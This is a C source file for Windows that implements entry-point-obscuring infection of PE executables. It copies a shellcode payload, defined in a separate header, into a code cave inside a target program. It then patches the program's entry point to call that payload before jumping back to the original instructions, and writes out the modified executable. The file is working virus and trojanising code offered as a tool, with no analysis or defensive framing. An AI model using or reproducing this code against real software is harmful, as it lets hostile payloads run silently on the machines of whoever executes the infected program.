#include "EPO.h"
#include "ldisasm.h"
#include <Windows.h>

VOID EPO(LPWSTR in, LPWSTR out) {
	// load file to heap
	HANDLE file = CreateFileW(in, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD fileSize = GetFileSize(file, NULL);
	LPVOID fileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
	ReadFile(file, fileBytesBuffer, fileSize, NULL, NULL);
	CloseHandle(file);

	// read header and stuff
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fileBytesBuffer;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((DWORD)fileBytesBuffer + dos->e_lfanew);
	PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((DWORD)fileBytesBuffer + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS32));

	// save old instruction
	DWORD beginOfEP = (DWORD)fileBytesBuffer + nt->OptionalHeader.AddressOfEntryPoint + sec->PointerToRawData - sec->VirtualAddress;
	size_t total = 0;
	while (total < 7) {
		//ldisasm -> to parse shellcode length since every opcode has different length
		size_t nt230 = ldisasm((LPVOID)(beginOfEP + total), false);
		total += nt230;
	}
	LPVOID savedInstruction = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
	memcpy(savedInstruction, (LPVOID)beginOfEP, total);

	// find code cave
	DWORD secLo = (DWORD)(nt)+sizeof(DWORD) + (DWORD)(sizeof(IMAGE_FILE_HEADER)) + (DWORD)(nt->FileHeader.SizeOfOptionalHeader);
	PIMAGE_SECTION_HEADER secHead = NULL;
	BYTE curByte = NULL;
	DWORD posInMem = NULL, count = 0, pos = NULL;
	DWORD sizeOfShellcode = sizeof(shellcode) + total + 5;
	for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
		secHead = (PIMAGE_SECTION_HEADER)secLo;
		for (pos = 0; pos < secHead->SizeOfRawData; ++pos) {
			posInMem = (DWORD)fileBytesBuffer + pos + secHead->PointerToRawData;
			curByte = *(BYTE*)posInMem;
			if (curByte == 0x00) {
				if (++count == sizeOfShellcode) {
					pos -= count;
					pos += secHead->PointerToRawData;
					break;
				}
			}
			else {
				count = 0;
			}
		}
		secLo += (DWORD)sizeof(IMAGE_SECTION_HEADER);
	}

	// + total saved byte and 5 byte of jmp to OEP
	DWORD shelladdr = (DWORD)fileBytesBuffer + pos + 1;
	memcpy((LPVOID)shelladdr, shellcode, sizeof(shellcode));

	// cpy old instruction to the end of shellcode
	memcpy((LPVOID)(shelladdr + sizeof(shellcode) - 1), savedInstruction, total);

	sec = secHead;
	// jmp back to OEP at the end of shellcode
	DWORD rawJmpAdd = pos + sizeof(shellcode) + total;
	DWORD virtualJmpAdd = rawJmpAdd - sec->PointerToRawData + sec->VirtualAddress + nt->OptionalHeader.ImageBase;
	DWORD oldEntry = nt->OptionalHeader.AddressOfEntryPoint;
	DWORD retNorm = oldEntry + nt->OptionalHeader.ImageBase - 5 - virtualJmpAdd + total;
	// jmp to retNorm
	memcpy((LPVOID)(shelladdr + sizeof(shellcode) - 1 + total), (LPVOID)"\xe9", 1);
	memcpy((LPVOID)(shelladdr + sizeof(shellcode) + total), &retNorm, 4);

	// jmp to shellcode at begining of file
	// jump instruction VA
	DWORD jmp_va = nt->OptionalHeader.AddressOfEntryPoint + sec->PointerToRawData - sec->VirtualAddress;
	// destination: begin of shellcode
	DWORD des = shelladdr - (DWORD)fileBytesBuffer + nt->OptionalHeader.ImageBase + sec->VirtualAddress - sec->PointerToRawData;
	// relative VA
	DWORD rel_va = des - 5 - jmp_va;
	// write nop :?
	memset((LPVOID)beginOfEP, 0x90, total);
	// write call des
	memcpy((LPVOID)beginOfEP, (void*)"\xb8", 1);
	memcpy((LPVOID)(beginOfEP + 1), &des, 4);
	memcpy((LPVOID)(beginOfEP + 5), (void*)"\xff\xd0", 2);

	HANDLE saveFile = CreateFileW(out, GENERIC_WRITE, 0, NULL, CREATE_NEW | OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(saveFile, fileBytesBuffer, fileSize, NULL, NULL);
	CloseHandle(saveFile);
}